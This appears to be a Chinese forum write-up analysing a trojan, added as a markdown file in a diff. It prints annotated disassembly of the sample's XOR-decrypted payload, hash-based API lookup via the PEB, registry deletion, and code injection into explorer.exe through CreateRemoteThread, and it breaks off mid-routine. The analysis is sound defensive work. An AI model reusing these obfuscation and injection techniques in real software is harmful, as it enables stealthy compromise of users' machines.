@@ -1,0 +1,460 @@
+
+
+# 一个注入型木马分析
+
+> 原文：[`www.pediy.com/kssd/pediy10/77523.html`](https://www.pediy.com/kssd/pediy10/77523.html)
+
+工 具：IDA5.2,Ollydgb,winhex,hiew,vmware.  
+心 情：心情不好。  
+特别申明：附件里面的 exe-1 文件为木马，如想调试分析，请在虚拟环境中调试，切不可在本机执行。  
+特别申明：附件里面的 exe-1 文件为木马，如想调试分析，请在虚拟环境中调试，切不可在本机执行。  
+特别申明：附件里面的 exe-1 文件为木马，如想调试分析，请在虚拟环境中调试，切不可在本机执行。  
+  
+  
+最近收到一个木马程序，每次分析一个木马总是草草了事，这次稍微认真的分析了一把，哎，流程化的工作害死人，害得人技术僵化，不思进取，最近挺郁闷的。  
+  
+用 IDA 打开要分析的木马：通过 IDA Function 标签可以立马定位到一张虚函数表，看到 IDA 给出的提示信息，应该是 mfc 库，除此之外没看到任何有用的信息，难道有加密？  
+  
+rdata:00402138 E2 11 40 00             off\_402138      dd offset ?GetRuntimeClass@CWinApp@@UBEPAUCRuntimeClass@@XZ  
+.rdata:00402138                                                                 ; DATA XREF: sub\_401080-56o  
+.rdata:00402138                                                                 ; .data:off\_405190o  
+.rdata:00402138                                                                 ; CWinApp::GetRuntimeClass(void)  
+.rdata:0040213C 40 10 40 00                             dd offset sub\_401040  （CWinApp::~CWinApp(void) 析构函数）  
+.rdata:00402140 F0 10 40 00                             dd offset nullsub\_2      
+.rdata:00402144 E0 10 40 00                             dd offset nullsub\_3  
+.rdata:00402148 F0 10 40 00                             dd offset nullsub\_2  
+.rdata:0040214C DC 11 40 00                             dd offset ?OnCmdMsg@CCmdTarget@@UAEHIHPAXPAUAFX\_CMDHANDLERINFO@@@Z ; CCmdTarget::OnCmdMsg(uint,int,void \*,AFX\_CMDHANDLERINFO \*)  
+.rdata:00402150 D6 11 40 00                             dd offset ?OnFinalRelease@CCmdTarget@@UAEXXZ ; CCmdTarget::OnFinalRelease(void)  
+.rdata:00402154 D0 11 40 00                             dd offset ?IsInvokeAllowed@CCmdTarget@@UAEHJ@Z ; CCmdTarget::IsInvokeAllowed(long)  
+.rdata:00402158 CA 11 40 00                             dd offset ?GetConnectionHook@CCmdTarget@@MAEPAUIConnectionPoint@@ABU\_GUID@@@Z ; CCmdTarget::GetConnectionHook(\_GUID const &)  
+.rdata:0040215C C4 11 40 00                             dd offset ?GetTypeInfoCount@CCmdTarget@@UAEIXZ ; CCmdTarget::GetTypeInfoCount(void)  
+.rdata:00402160 BE 11 40 00                             dd offset MFC42\_3825  
+.rdata:00402164 B8 11 40 00                             dd offset ?GetTypeLib@CCmdTarget@@UAEJKPAPAUITypeLib@@@Z ; CCmdTarget::GetTypeLib(ulong,ITypeLib \* \*)  
+.rdata:00402168 10 10 40 00                             dd offset sub\_401010  
+.rdata:0040216C B2 11 40 00                             dd offset ?GetCommandMap@CCmdTarget@@MBEPBUAFX\_OLECMDMAP@@XZ ; CCmdTarget::GetCommandMap(void)  
+.rdata:00402170 AC 11 40 00                             dd offset ?GetDispatchMap@CCmdTarget@@MBEPBUAFX\_DISPMAP@@XZ ; CCmdTarget::GetDispatchMap(void)  
+.rdata:00402174 A6 11 40 00                             dd offset ?GetConnectionMap@CCmdTarget@@MBEPBUAFX\_CONNECTIONMAP@@XZ ; CCmdTarget::GetConnectionMap(void)  
+.rdata:00402178 A0 11 40 00                             dd offset ?GetInterfaceMap@CCmdTarget@@MBEPBUAFX\_INTERFACEMAP@@XZ ; CCmdTarget::GetInterfaceMap(void)  
+.rdata:0040217C 9A 11 40 00                             dd offset ?GetEventSinkMap@CCmdTarget@@MBEPBUAFX\_EVENTSINKMAP@@XZ ; CCmdTarget::GetEventSinkMap(void)  
+.rdata:00402180 94 11 40 00                             dd offset ?CheckAutoCenter@CWnd@@UAEHXZ ; CWnd::CheckAutoCenter(void)  
+.rdata:00402184 8E 11 40 00                             dd offset MFC42\_2982\_1  
+.rdata:00402188 88 11 40 00                             dd offset MFC42\_2982\_0  
+.rdata:0040218C 82 11 40 00                             dd offset MFC42\_2982  
+.rdata:00402190 B0 10 40 00                             dd offset sub\_4010B0 （CWinApp::::InitInstance()）注意这里，MFC 的程序的入口点.rdata:00402194 7C 11 40 00                             dd offset ?Run@CWinApp@@UAEHXZ ; CWinApp::Run(void)  
+.rdata:00402198 76 11 40 00                             dd offset ?PreTranslateMessage@CWinThread@@UAEHPAUtagMSG@@@Z ; CWinThread::PreTranslateMessage(tagMSG \*)  
+.rdata:0040219C 70 11 40 00                             dd offset ?PumpMessage@CWinThread@@UAEHXZ ; CWinThread::PumpMessage(void)  
+.rdata:004021A0 6A 11 40 00                             dd offset ?OnIdle@CWinApp@@UAEHJ@Z ; CWinApp::OnIdle(long)  
+.rdata:004021A4 64 11 40 00                             dd offset ?IsIdleMessage@CWinThread@@UAEHPAUtagMSG@@@Z ; CWinThread::IsIdleMessage(tagMSG \*)  
+.rdata:004021A8 5E 11 40 00                             dd offset ?ExitInstance@CWinApp@@UAEHXZ ; CWinApp::ExitInstance(void)  
+.rdata:004021AC 58 11 40 00                             dd offset ?ProcessWndProcException@CWinApp@@UAEJPAVCException@@PBUtagMSG@@@Z ; CWinApp::ProcessWndProcException(CException \*,tagMSG const \*)  
+.rdata:004021B0 52 11 40 00                             dd offset ?ProcessMessageFilter@CWinThread@@UAEHHPAUtagMSG@@@Z ; CWinThread::ProcessMessageFilter(int,tagMSG \*)  
+.rdata:004021B4 4C 11 40 00                             dd offset ?GetMainWnd@CWinThread@@UAEPAVCWnd@@XZ ; CWinThread::GetMainWnd(void)  
+.rdata:004021B8 46 11 40 00                             dd offset ?Delete@CWinThread@@UAEXXZ ; CWinThread::Delete(void)  
+.rdata:004021BC 40 11 40 00                             dd offset ?OpenDocumentFile@CWinApp@@UAEPAVCDocument@@PBD@Z ; CWinApp::OpenDocumentFile(char const \*)  
+.rdata:004021C0 3A 11 40 00                             dd offset ?AddToRecentFileList@CWinApp@@UAEXPBD@Z ; CWinApp::AddToRecentFileList(char const \*)  
+.rdata:004021C4 34 11 40 00                             dd offset ?InitApplication@CWinApp@@UAEHXZ ; CWinApp::InitApplication(void)  
+.rdata:004021C8 2E 11 40 00                             dd offset ?SaveAllModified@CWinApp@@UAEHXZ ; CWinApp::SaveAllModified(void)  
+.rdata:004021CC 28 11 40 00                             dd offset ?DoMessageBox@CWinApp@@UAEHPBDII@Z ; CWinApp::DoMessageBox(char const \*,uint,uint)  
+.rdata:004021D0 22 11 40 00                             dd offset ?DoWaitCursor@CWinApp@@UAEXH@Z ; CWinApp::DoWaitCursor(int)  
+.rdata:004021D4 1C 11 40 00                             dd offset ?OnDDECommand@CWinApp@@UAEHPAD@Z ; CWinApp::OnDDECommand(char \*)  
+.rdata:004021D8 16 11 40 00                             dd offset ?WinHelpA@CWinApp@@UAEXKI@Z ; CWinApp::WinHelpA(ulong,uint)  
+.rdata:004021DC 00                                      db    0  
+  
+  
+在 IDA 中定位到 dd offset sub\_4010B0 ，注意：因为用 IDA 打开程序仅仅发现了一张虚函数表，所以此程序仅仅用到了一个类，由于这张虚函数表是由编译器加入的一段 mfc 的源代码，  
+所以这个 CWinApp::InitInstance() 也是固定的地址，sub\_4010B0（为此你可以写一个对话框的程序自己分析分析，看看是否与我上面给出的虚函数表十分相同，一般 VC 向导生成的  
+对话框程序，会用到两个类实例 CWinApp,CDialog(about 对话框)，所以会有两张虚函数表）  
+  
+好的，定位到 Sub\_4010B0  
+  
+.text:004010B0                         sub\_4010B0      proc near               ; DATA XREF: .rdata:00402190o  
+.text:004010B0 33 C0                                   xor     eax, eax  
+.text:004010B2 B1 AB                                   mov     cl, 0ABh  
+.text:004010B4  
+.text:004010B4                         loc\_4010B4:                             ; CODE XREF: sub\_4010B0+18j  
+.text:004010B4 8A 90 20 30 40 00                       mov     dl, byte\_403020\[eax\]  
+.text:004010BA 32 D1                                   xor     dl, cl  
+.text:004010BC 88 90 20 30 40 00                       mov     byte\_403020\[eax\], dl  
+.text:004010C2 40                                      inc     eax  
+.text:004010C3 3D 60 21 00 00                          cmp     eax, 2160h  
+.text:004010C8 7C EA                                   jl      short loc\_4010B4  
+.text:004010CA 8D 05 20 30 40 00                       lea     eax, byte\_403020  
+.text:004010D0 FF D0                                   call    eax  
+.text:004010D2 33 C0                                   xor     eax, eax  
+.text:004010D4 C3                                      retn  
+.text:004010D4                         sub\_4010B0      endp  
+  
+果然，有一段解密代码，难怪起初看不到任何有害的代码，不过这段解密算是简单，仅仅是将 403020（数据段），里面的数据与 cl=0abh 做字节异或，异或长度为 2160h  
+所以我写了一个简单的 IDC 脚本（你也可以用 OD 来下断点调试）  
+脚本：  
+  
+auto start,length,key,index;  
+start=ScreenEA();  
+length=0x2160;  
+key=0xab;  
+index=0;  
+for(;index <length;index++)  
+{  
+  PatchByte(start,Byte(start)^key);  
+  start++;  
+}    
+  
+在 IDA 中定位到 403020 将光标定位到 403020 Shift+F2 输入以上代码，则原先被加密起来的代码，就被解密掉了（解密是为以后动态分析，和静态做记录提供方便，  
+不过你也可以用 OD 载入运行到 004010D0 后用 OD 的 dump 插件 dump 后接着用 IDA 分析,附件里面的 dump.idb 文件就是解密后从 ODdump 出来的文件）  
+  
+在虚拟机中用 OD 载入木马程序，直接在 4010d2 F2 下断点，断下后 F7 进入，则就到了真正的木马程序部分。  
+  
+在未用的堆栈区分配一片内存  
+  
+data:00403020 55                                      push    ebp  
+.data:00403021 8B EC                                   mov     ebp, esp  
+.data:00403023 81 C4 3C F2 FF FF                       add     esp, 0FFFFF23Ch  
+.data:00403029 60                                      pusha  
+.data:0040302A 33 C0                                   xor     eax, eax  
+.data:0040302C 8D BD 90 F2 FF FF                       lea     edi, \[ebp-0D70h\]  
+.data:00403032 B9 5B 0D 00 00                          mov     ecx, 0D5Bh  
+.data:00403037 F3 AA                                   rep stosb                   //分配内存  
+.data:00403039 33 C0                                   xor     eax, eax  
+.data:0040303B 8D BD 4C F2 FF FF                       lea     edi, \[ebp-0DB4h\]  
+.data:00403041 B9 44 00 00 00                          mov     ecx, 44h            //分配内存  
+.data:00403046 F3 AA                                   rep stosb  
+.data:00403048 C7 85 B9 F3 FF FF E6 00+                mov     dword ptr \[ebp-0C47h\], 0E6h  
+.data:00403052 E9 A6 13 00 00                          jmp     loc\_4043FD           //跳转跟进  
+  
+接着是一处循环，利用 rdtsc （读入 cpu 时间戳到 EDX:EAX）(之初以为它是想做反调试，作用其实跟 GetTickcount 比较一些指令之间的时间差，最后发现并没有比较这个)  
+循环中，是将时间戳的 EAX 部分连续乘以 0AC564B05h 22h 次，并将每次的积放入上面分配的内存里面。（可能以后有用，且不管）  
+  
+.data:004043FD 8D B5 90 F2 FF FF                       lea     esi, \[ebp-0D70h\]  
+.data:00404403 0F 31                                   rdtsc  
+.data:00404405 92                                      xchg    eax, edx  
+.data:00404406 33 C9                                   xor     ecx, ecx  
+.data:00404408  
+.data:00404408                         loc\_404408:                             ; CODE XREF: .data:0040441Ej  
+.data:00404408 69 C0 05 4B 56 AC                       imul    eax, 0AC564B05h  
+.data:0040440E 83 C0 01                                add     eax, 1  
+.data:00404411 89 84 8E D9 08 00 00                    mov     \[esi+ecx\*4+8D9h\], eax  
+.data:00404418 83 C1 01                                add     ecx, 1  
+.data:0040441B 83 F9 22                                cmp     ecx, 22h  
+.data:0040441E 72 E8                                   jb      short loc\_404408  
+  
+接着往下看 sub\_40439E，被调用了两处，其中一处是在一个循环中，这个函数是对上面的 时间戳数组做了一轮变换（一下代码应该比较明显）  
+  
+data:0040439E                         sub\_40439E      proc near               ; CODE XREF: .data:0040443Cp  
+.data:0040439E                                                                 ; .data:loc\_404447p  
+.data:0040439E 53                                      push    ebx  
+.data:0040439F 8B 9E D1 08 00 00                       mov     ebx, \[esi+8D1h\]     //取出需要变换的数据  
+.data:004043A5 8B 8E D5 08 00 00                       mov     ecx, \[esi+8D5h\]     //取出需要变换的数据  
+.data:004043AB 8B 94 33 D9 08 00 00                    mov     edx, \[ebx+esi+8D9h\]  
+.data:004043B2 8B 84 33 DD 08 00 00                    mov     eax, \[ebx+esi+8DDh\]  
+.data:004043B9 C1 C2 13                                rol     edx, 13h             //移位变换  
+.data:004043BC C1 C0 1B                                rol     eax, 1Bh             //移位变换  
+.data:004043BF 03 94 31 D9 08 00 00                    add     edx, \[ecx+esi+8D9h\]  
+.data:004043C6 03 84 31 DD 08 00 00                    add     eax, \[ecx+esi+8DDh\]  
+.data:004043CD 89 84 33 D9 08 00 00                    mov     \[ebx+esi+8D9h\], eax  
+.data:004043D4 89 94 33 DD 08 00 00                    mov     \[ebx+esi+8DDh\], edx  
+.data:004043DB 83 EB 08                                sub     ebx, 8  
+.data:004043DE 73 05                                   jnb     short loc\_4043E5  
+.data:004043E0 BB 80 00 00 00                          mov     ebx, 80h  
+.data:004043E5  
+.data:004043E5                         loc\_4043E5:                             ; CODE XREF: sub\_40439E+40j  
+.data:004043E5 83 E9 08                                sub     ecx, 8  
+.data:004043E8 73 05                                   jnb     short loc\_4043EF  
+.data:004043EA B9 80 00 00 00                          mov     ecx, 80h  
+.data:004043EF  
+.data:004043EF                         loc\_4043EF:                             ; CODE XREF: sub\_40439E+4Aj  
+.data:004043EF 89 9E D1 08 00 00                       mov     \[esi+8D1h\], ebx     //保存变化后的数据  
+.data:004043F5 89 8E D5 08 00 00                       mov     \[esi+8D5h\], ecx     //保存变化后的数据  
+.data:004043FB 5B                                      pop     ebx  
+.data:004043FC C3                                      retn  
+.data:004043FC                         sub\_40439E      endp  
+  
+  
+接下来用 fs:30,找到 PEB，进而找到 kernel32.dll 在内存中的加载地址  
+  
+  
+.data:00404452 64 A1 30 00 00 00                       mov     eax, large fs:30h  
+.data:00404458 8B 40 0C                                mov     eax, \[eax+0Ch\]  
+.data:0040445B 8B 70 1C                                mov     esi, \[eax+1Ch\]  
+.data:0040445E AD                                      lodsd                
+.data:0040445F FF 70 08                                push    dword ptr \[eax+8\] 得到 kernel 的加载地址   
+.data:00404462 8F 85 4B FD FF FF                       pop     dword ptr \[ebp-2B5h\]  
+.data:00404468 68 AD D1 34 41                          push    4134D1ADh            //LoadlibrayA 函数的信息摘要 ，姑且这样说吧）  
+.data:0040446D FF B5 4B FD FF FF                       push    dword ptr \[ebp-2B5h\]  
+.data:00404473 6A 00                                   push    0  
+.data:00404475 E8 B4 F7 FF FF                          call    sub\_403C2E  （这个函数是一个利用信息摘要寻在对应的 API）  
+.data:0040447A 89 85 2D F3 FF FF                       mov     \[ebp-0CD3h\], eax  
+.data:00404480 E8 09 00 00 00                          call    near ptr loc\_40448D+1  
+.data:00404485 61                                      popa  
+.data:00404486                                         db      64h  
+.data:00404486 64 76 61                                jbe     short loc\_4044EA  
+.data:00404489 70 69                                   jo      short loc\_4044F4  
+.data:0040448B 33 32                                   xor     esi, \[edx\]  
+.data:0040448D  
+.data:0040448D                         loc\_40448D:                             ; CODE XREF: .data:00404480p  
+.data:0040448D 00 FF                                   add     bh, bh  
+.data:0040448F 95                                      xchg    eax, ebp  
+.data:00404490 2D F3 FF FF 89                          sub     eax, 89FFFFF3h  
+.data:00404495 85 63 FD                                test    \[ebx-3\], esp  
+  
+函数 sub\_403C2E 是获得函数的地址，在遍历导出函数时，先将函数的名字用用摘要算法生成摘要，并与预期的摘要相比，如相等，则将此函数地址返回。  
+sub\_403C2E 里面实际上是索引所有导出函数。要了解请参考 PE 结构里面的导出表。  
+  
+继续往下，进入 call loc\_40448E  
+  
+分析到这里，考虑到 OD 会在调试的时候给出一些 API 的提示信息，将有助于我们理解木马的行为，请出 OD  
+  
+Ctr+G 到达 40448E，在此下硬件可执行断点 F9 运行 断在 40448e  
+  
+OD F7 一路往前走 到达  
+00404621   833F 00          CMP DWORD PTR DS:\[EDI\],0  
+00404624   74 1C            JE SHORT freecell.00404642  
+00404626   0FB747 04        MOVZX EAX,WORD PTR DS:\[EDI+4\]  
+0040462A   FF37             PUSH DWORD PTR DS:\[EDI\]          //EDI=4044ce 这里存储就是我说的一些 API 的信息摘要，这里逐个获得 API 的地址  
+0040462C   FF3430           PUSH DWORD PTR DS:\[EAX+ESI\]  
+0040462F   6A 00            PUSH 0  
+00404631   E8 F8F5FFFF      CALL freecell.00403C2E           //sub\_403C2E（通过信息摘要获得 API 地址）  
+00404636   0FB757 06        MOVZX EDX,WORD PTR DS:\[EDI+6\]  
+0040463A   890432           MOV DWORD PTR DS:\[EDX+ESI\],EAX  
+0040463D   83C7 08          ADD EDI,8  
+00404640  ^EB DF            JMP SHORT freecell.00404621      //jump to 404621 这里是一个循环，旨在通过信息摘要表获得 APIs  
+  
+上述循环在   
+00404621   833F 00          CMP DWORD PTR DS:\[EDI\],0  
+跳出  
+  
+00404624   74 1C            JE SHORT freecell.00404642  
+  
+F4 到 00404642  
+  
+继续 F7 跟进 到达如下  
+  
+00404642   E8 00000000      CALL freecell.00404647  F7 跟进（实际到达下一条指令）  
+00404647   5E               POP ESI  
+00404648   81C6 9A020000    ADD ESI,29A  
+0040464E   8DBD 90F2FFFF    LEA EDI,DWORD PTR SS:\[EBP-D70\]     //用上了之前分配的内存  
+00404654   0FB706           MOVZX EAX,WORD PTR DS:\[ESI\]  
+00404657   0FB74E 02        MOVZX ECX,WORD PTR DS:\[ESI+2\]  
+0040465B   83C6 04          ADD ESI,4  
+0040465E   03C7             ADD EAX,EDI  
+00404660   51               PUSH ECX  
+00404661   51               PUSH ECX  
+00404662   56               PUSH ESI  
+00404663   50               PUSH EAX  
+00404664   FF95 39F3FFFF    CALL DWORD PTR SS:\[EBP-CC7\]              ; ntdll.RtlMoveMemory  
+0040466A   59               POP ECX  
+0040466B   03F1             ADD ESI,ECX  
+0040466D   66:833E 00       CMP WORD PTR DS:\[ESI\],0  
+00404671  ⁷⁵ E1            JNZ SHORT freecell.00404654         //Jump to 00404654 循环拷贝解密后的字符串到在最前面那阶段分配的内存里  
+  
+可以在内存中观看拷贝的字符串：一些注册表键值，木马拷贝到说 system32 目录下的名字，以及其创建的 mutex...  
+  
+00404682   6A 01            PUSH 1  
+00404684   8D85 90F2FFFF    LEA EAX,DWORD PTR SS:\[EBP-D70\]  
+0040468A   50               PUSH EAX  
+0040468B   83C6 04          ADD ESI,4  
+0040468E   FFD6             CALL ESI                                 ; freecell.00404A3C F7 跟进  
+  
+一路 F8，注册表操作  
+  
+00404BB9   50               PUSH EAX  
+00404BBA   68 3F000F00      PUSH 0F003F  
+00404BBF   6A 00            PUSH 0  
+00404BC1   8D86 56040000    LEA EAX,DWORD PTR DS:\[ESI+456\]  
+00404BC7   50               PUSH EAX                                 ; ASCII "Software\\Microsoft\\Active Setup\\Installed Components\\"  
+00404BC8   68 01000080      PUSH 80000001  
+00404BCD   FF56 35          CALL DWORD PTR DS:\[ESI+35\]               ; ADVAPI32.RegOpenKeyExA  
+00404BD0   8D86 65010000    LEA EAX,DWORD PTR DS:\[ESI+165\]  
+00404BD6   50               PUSH EAX  
+00404BD7   FF75 FC          PUSH DWORD PTR SS:\[EBP-4\]  
+00404BDA   FF56 41          CALL DWORD PTR DS:\[ESI+41\]               ; ADVAPI32.RegDeleteKeyA   
+00404BDD   FF75 FC          PUSH DWORD PTR SS:\[EBP-4\]  
+00404BE0   FF56 31          CALL DWORD PTR DS:\[ESI+31\]                 
+00404BE3   837D 0C 01       CMP DWORD PTR SS:\[EBP+C\],1  
+00404BE7   75 04            JNZ SHORT freecell.00404BED  
+00404BE9   C9               LEAVE  
+00404BEA   C2 0800          RETN 8  
+  
+返回到：404690  
+  
+00404690   68 92F3DC04      PUSH 4DCF392                    ;GetMoudleFileNameA  
+00404695   FFB5 4BFDFFFF    PUSH DWORD PTR SS:\[EBP-2B5\]  
+0040469B   6A 00            PUSH 0  
+0040469D   E8 8CF5FFFF      CALL freecell.00403C2E           ;sub\_00403C2E()  
+004046A2   68 FF000000      PUSH 0FF  
+004046A7   8D9D 42F8FFFF    LEA EBX,DWORD PTR SS:\[EBP-7BE\]  
+004046AD   53               PUSH EBX  
+004046AE   6A 00            PUSH 0  
+004046B0   FFD0             CALL EAX                        ;call GetMoudleFileNameA  
+004046B2   50               PUSH EAX  
+004046B3   68 03BF2139      PUSH 3921BF03                   ;GetCommandLineA  
+004046B8   FFB5 4BFDFFFF    PUSH DWORD PTR SS:\[EBP-2B5\]  
+004046BE   6A 00            PUSH 0  
+004046C0   E8 69F5FFFF      CALL freecell.00403C2E          ;sub\_00403C2E()  
+004046C5   FFD0             CALL EAX                        ;call GetCommandLineA  
+004046C7   50               PUSH EAX  
+004046C8   FF95 80FDFFFF    CALL DWORD PTR SS:\[EBP-280\]     ;Kernel.Istrlen  
+004046CE   83E8 03          SUB EAX,3  
+004046D1   59               POP ECX  
+004046D2   3BC8             CMP ECX,EAX  
+004046D4   75 2D            JNZ SHORT freecell.00404703  
+004046D6   8D85 3CF2FFFF    LEA EAX,DWORD PTR SS:\[EBP-DC4\]  
+004046DC   50               PUSH EAX  
+004046DD   8D85 4CF2FFFF    LEA EAX,DWORD PTR SS:\[EBP-DB4\]  
+004046E3   50               PUSH EAX  
+004046E4   6A 00            PUSH 0  
+004046E6   6A 00            PUSH 0  
+004046E8   6A 00            PUSH 0  
+004046EA   6A 00            PUSH 0  
+004046EC   6A 00            PUSH 0  
+004046EE   6A 00            PUSH 0  
+004046F0   8D85 9FF6FFFF    LEA EAX,DWORD PTR SS:\[EBP-961\]  
+004046F6   50               PUSH EAX  
+004046F7   53               PUSH EBX  
+004046F8   FF95 BDF2FFFF    CALL DWORD PTR SS:\[EBP-D43\]  
+004046FE   E9 DB010000      JMP freecell.004048DE  
+00404703   E8 08000000      CALL freecell.00404710  
+  
+F7 进入 freecell.00404710  
+00404710   FF95 2DF3FFFF    CALL DWORD PTR SS:\[EBP-CD3\]                ;LoadLibrary  
+00404716   68 6B37047E      PUSH 7E04376B                              ;IsNTAdmin  
+0040471B   50               PUSH EAX  
+0040471C   6A 00            PUSH 0  
+0040471E   E8 0BF5FFFF      CALL freecell.00403C2E  
+00404723   6A 00            PUSH 0  
+00404725   6A 00            PUSH 0  
+00404727   FFD0             CALL EAX  
+00404729   8885 3FFBFFFF    MOV BYTE PTR SS:\[EBP-4C1\],AL  
+0040472F   68 0E03E5E6      PUSH E6E5030E                              ;RtGetLastError  
+00404734   FFB5 6BFDFFFF    PUSH DWORD PTR SS:\[EBP-295\]  
+0040473A   6A 00            PUSH 0  
+0040473C   E8 EDF4FFFF      CALL freecell.00403C2E  
+00404741   0BC0             OR EAX,EAX  
+00404743   75 12            JNZ SHORT freecell.00404757  
+00404745   68 942CD587      PUSH 87D52C94  
+0040474A   FFB5 4BFDFFFF    PUSH DWORD PTR SS:\[EBP-2B5\]  
+00404750   6A 00            PUSH 0  
+00404752   E8 D7F4FFFF      CALL freecell.00403C2E  
+00404757   8985 19F3FFFF    MOV DWORD PTR SS:\[EBP-CE7\],EAX  
+0040475D   8D85 8BF6FFFF    LEA EAX,DWORD PTR SS:\[EBP-975\]  
+00404763   50               PUSH EAX                                 ; )!VOA.I4  
+00404764   6A 00            PUSH 0  
+00404766   6A 00            PUSH 0  
+00404768   FF95 15F3FFFF    CALL DWORD PTR SS:\[EBP-CEB\]              ; kernel32.CreateMutexA  
+0040476E   8945 FC          MOV DWORD PTR SS:\[EBP-4\],EAX  
+00404771   FF95 19F3FFFF    CALL DWORD PTR SS:\[EBP-CE7\]  
+00404777   3D B7000000      CMP EAX,0B7  
+0040477C   0F84 5C010000    JE freecell.004048DE  
+00404782   FF75 FC          PUSH DWORD PTR SS:\[EBP-4\]  
+00404785   FF95 31F3FFFF    CALL DWORD PTR SS:\[EBP-CCF\]              ; kernel32.CloseHandle  
+  
+一路 F8 遇到 4047AB 跟进，这里将枚举进程并获得直到枚举到 explorer，返回其进程 ID，以备木马将有害代码注入其中：我这里直接给出我分析过的东西  
+并将一些函数已经做了注解，附件里面包括了该木马分析的 IDB 文件  
+  
+.data:004047AB                         loc\_4047AB:                             ; CODE XREF: sub\_404710+89p  
+.data:004047AB 8D 85 90 F2 FF FF                       lea     eax, \[ebp-0D70h\]  
+.data:004047B1 50                                      push    eax  
+.data:004047B2 E8 61 F5 FF FF                          call    Obtain\_PIDofExplorer //address is 403d18 in od  
+.data:004047B7 0B C0                                   or      eax, eax  
+.data:004047B9 75 14                                   jnz     short loc\_4047CF  
+.data:004047BB 68 E8 03 00 00                          push    3E8h  
+.data:004047C0 FF 95 35 F3 FF FF                       call    dword ptr \[ebp-0CCBh\]  
+.data:004047C6 C7 45 F0 00 00 00 00                    mov     dword ptr \[ebp-10h\], 0  
+.data:004047CD EB C3                                   jmp     short loc\_404792  
+.data:004047CF                         ; ---------------------------------------------------------------------------  
+.data:004047CF  
+.data:004047CF                         loc\_4047CF:                             ; CODE XREF: .data:004047B9j  
+.data:004047CF 50                                      push    eax  
+.data:004047D0 6A 00                                   push    0  
+.data:004047D2  
+.data:004047D2                         loc\_4047D2:                             ; CODE XREF: sub\_404710+95j  
+.data:004047D2 68 FF 0F 1F 00                          push    1F0FFFh  
+.data:004047D7 FF 95 25 F3 FF FF                       call    dword ptr \[ebp-0CDBh\] ; OpenProcess : Open explorer.exe  
+.data:004047DD 83 F8 00                                cmp     eax, 0  
+.data:004047E0 74 B0                                   jz      short loc\_404792  
+.data:004047E2 89 45 F4                                mov     \[ebp-0Ch\], eax  
+.data:004047E5 E8 00 00 00 00                          call    $+5  
+.data:004047EA 58                                      pop     eax  
+.data:004047EB 2D 93 17 00 00                          sub     eax, 1793h  
+.data:004047F0 50                                      push    eax  
+.data:004047F1 68 47 13 00 00                          push    1347h  
+.data:004047F6 FF 75 F4                                push    dword ptr \[ebp-0Ch\]  
+.data:004047F9 8D 85 90 F2 FF FF                       lea     eax, \[ebp-0D70h\]  
+.data:004047FF 50                                      push    eax  
+.data:00404800 E8 ED F3 FF FF                          call    WriteCodeintoExplorer          //将木马的代码拷贝进 explorer.exe 进程  
+.data:00404805 E8 44 00 00 00                          call    WriteMoreCodeintoExplorer      //F7 跟进  
+  
+  
+WriteMoreCodeintoExplorer 函数，将剩余的代码写入 Explorer.exe 进程，前前后后总共拷贝了四次才将所有有害代码完全注入到 explorere.exe 中，注入完全后，调用 CreateRemoteThread 启动 拷贝进去的代码  
+  
+.data:0040484E                         WriteMoreCodeintoExplorer proc near     ; CODE XREF: .data:00404805p  
+.data:0040484E 59                                      pop     ecx  
+.data:0040484F 8D B5 90 F2 FF FF                       lea     esi, \[ebp-0D70h\]  
+.data:00404855  
+.data:00404855                         loc\_404855:                             ; CODE XREF: WriteMoreCodeintoExplorer+1Dj  
+.data:00404855 0F B7 11                                movzx   edx, word ptr \[ecx\]  
+.data:00404858 89 04 32                                mov     \[edx+esi\], eax  
+.data:0040485B 66 83 79 02 00                          cmp     word ptr \[ecx+2\], 0  
+.data:00404860 74 0B                                   jz      short loc\_40486D  
+.data:00404862 0F B7 51 02                             movzx   edx, word ptr \[ecx+2\]  
+.data:00404866 03 C2                                   add     eax, edx  
+.data:00404868 83 C1 04                                add     ecx, 4  
+.data:0040486B EB E8                                   jmp     short loc\_404855  
+.data:0040486D                         ; ---------------------------------------------------------------------------  
+.data:0040486D  
+.data:0040486D                         loc\_40486D:                             ; CODE XREF: WriteMoreCodeintoExplorer+12j  
+.data:0040486D 8B 7D EC                                mov     edi, \[ebp-14h\]  
+.data:00404870 66 83 3F 00                             cmp     word ptr \[edi\], 0  
+.data:00404874 74 00                                   jz      short $+2  
+.data:00404876  
+.data:00404876                         loc\_404876:                             ; CODE XREF: WriteMoreCodeintoExplorer+4Bj  
+.data:00404876 0F B7 07                                movzx   eax, word ptr \[edi\]  
+.data:00404879 0F B7 4F 02                             movzx   ecx, word ptr \[edi+2\]  
+.data:0040487D 83 C7 04                                add     edi, 4  
+.data:00404880 03 C6                                   add     eax, esi  
+.data:00404882 51                                      push    ecx  
+.data:00404883 50                                      push    eax  
+.data:00404884 57                                      push    edi  
+.data:00404885 51                                      push    ecx  
+.data:00404886 FF 75 F4                                push    dword ptr \[ebp-0Ch\]  
+.data:00404889 56                                      push    esi  
+.data:0040488A E8 63 F3 FF FF                          call    WriteCodeintoExplorer  
+.data:0040488F 59                                      pop     ecx  
+.data:00404890 89 01                                   mov     \[ecx\], eax  
+.data:00404892 59                                      pop     ecx  
+.data:00404893 03 F9                                   add     edi, ecx  
+.data:00404895 66 83 3F 00                             cmp     word ptr \[edi\], 0  
+.data:00404899 75 DB                                   jnz     short loc\_404876  
+.data:0040489B 8D 85 90 F2 FF FF                       lea     eax, \[ebp-0D70h\]  
+.data:004048A1 50                                      push    eax  
+.data:004048A2 68 5B 0D 00 00                          push    0D5Bh  
+.data:004048A7 FF 75 F4                                push    dword ptr \[ebp-0Ch\]  
+.data:004048AA 50                                      push    eax  
+.data:004048AB E8 42 F3 FF FF                          call    WriteCodeintoExplorer  
+.data:004048B0 8D 4D F8                                lea     ecx, \[ebp-8\]  
+.data:004048B3 51                                      push    ecx  
+.data:004048B4 6A 00                                   push    0  
+.data:004048B6 50                                      push    eax  
+.data:004048B7 FF B5 65 F3 FF FF                       push    dword ptr \[ebp-0C9Bh\]  
+.data:004048BD 6A 00                                   push    0  
+.data:004048BF 6A 00                                   push    0  
+.data:004048C1 FF 75 F4                                push    dword ptr \[ebp-0Ch\]  
+.data:004048C4 FF 95 59 F3 FF FF                       call    dword ptr \[ebp-0CA7h\] ; CreateRemoteThread 开启远程进程启动注入到 explorer 中的代码  
+.data:004048CA 50                                      push    eax  
+.data:004048CB FF 75 F4                                push    dword ptr \[ebp-0Ch\]  
+.data:004048CE FF 95 31 F3 FF FF                       call    dword ptr \[ebp-0CCFh\]  
+.data:004048D4 58                                      pop     eax  
